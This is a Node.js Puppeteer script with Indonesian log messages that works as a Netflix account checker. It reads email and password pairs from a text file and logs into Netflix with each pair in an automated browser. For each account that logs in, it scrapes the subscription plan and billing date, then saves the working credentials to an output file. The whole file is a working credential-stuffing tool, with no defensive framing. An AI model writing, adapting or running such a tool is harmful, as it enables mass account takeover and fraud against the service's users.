const puppeteer = require('puppeteer');
const fs = require('fs');
const fsa = require("async-file");
const filemu = "akun.txt";

(async () => {

    await fs.readFile(filemu, async function(err, data) {
        if (err) throw err;
        const array = data
        .toString()
        .replace(/\r/g, "")
        .split('\n')
        
        for(let i = 0; i < array.length; i++){
        const empas = array[i].split('|')
        const email = empas[0]
        const pass = empas[1]

    const browser = await puppeteer.launch({  
        executablePath:'C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe',
        headless:false,
        devtools:false,
    })
    const page = await browser.newPage()
    await page.goto("https://www.netflix.com/id-en/login", {waitUntil: "networkidle2"})
    console.log("[=] Meng-input email " +email+ " Done!")
    await page.type("#id_userLoginId", email)
    await page.type("#id_password", pass, {delay: 15})
    await page.click("#appMountPoint > div > div.login-body > div > div > div.hybrid-login-form-main > form > button")
    await page.waitForNavigation()
    if(await page.url().indexOf("browse") > -1) { 
        console.log("[+] Sukses Login ...")
        await page.goto("https://www.netflix.com/BillingActivity")
        console.log("[+] Sedang Mengecek plan ...")
        try {
            if (await page.waitForSelector("#appMountPoint > div > div > div.uma", {timeout:1000})) {
                    let yourplan = await page.$eval('#appMountPoint > div > div > div.uma > div > article > section > h2', el => el.innerText);
                    let nextbill = await page.$eval('#appMountPoint > div > div > div.bd > div > div > section > div > div:nth-child(5)', el => el.innerText);
                    console.log(`[+] Sorry, ${yourplan} nextbill ${nextbill}`)
                    await fsa.appendFile("hasil_ceker.txt", email+"|"+pass+"|"+yourplan+"|"+nextbill+"\n", "utf-8");
            console.log('[+] Menyimpan data\n\n')
            await browser.close()
            }
        } catch (err) {
            await page.goto("https://www.netflix.com/BillingActivity")
            let yourplan = await page.$eval('#appMountPoint > div > div > div.bd > div > div > section > div > div:nth-child(2) > span', el => el.innerText);
            let nextbill = await page.$eval('#appMountPoint > div > div > div.bd > div > div > section > div > div:nth-child(5)', el => el.innerText);
            console.log(`[+] Sukses, Yourplan is ${yourplan} nextbill ${nextbill}`)
            await fsa.appendFile("hasil_ceker.txt", email+"|"+pass+"|"+yourplan+"|"+nextbill+"\n", "utf-8");
            console.log('[+] Menyimpan data\n\n')
            await browser.close()
        }
        continue
    } else if (await page.url().indexOf("signup") > -1) { 
        console.log("[+] Sukses Login ...")
        await page.goto("https://www.netflix.com/youraccount")
        console.log("[+] Sedang Mengecek plan ...")
        await page.waitForSelector("#appMountPoint > div > div > div.bd > div > div > div.account-messages-container > div > div.ui-message-contents", {delay: 300});
        let yourplan = await page.$eval('#appMountPoint > div > div > div.bd > div > div > div.account-messages-container > div > div.ui-message-contents', el => el.innerText);
        console.log(`[-] Sorry, ${yourplan}`)
        await fsa.appendFile("hasil_ceker.txt", email+"|"+pass+"|"+yourplan+"\n", "utf-8");
        console.log('[+] Menyimpan data\n\n')
        await browser.close()
    } else {
        const gagal = await page.$eval('#appMountPoint > div > div.login-body > div > div > div.hybrid-login-form-main > div > div.ui-message-contents', (element) => {
            return element.innerText
        });
        if (gagal.includes("Incorrect password")) {
            console.log('[-] Gagal, Password salah\n\n')
            await browser.close()
            continue
        } else if (gagal.includes("Sorry, we can't find an account")){
            console.log('[-] Gagal, Tidak dapat menemukan akun\n\n')
            await browser.close()
            continue
        }
    }
}
})
})()
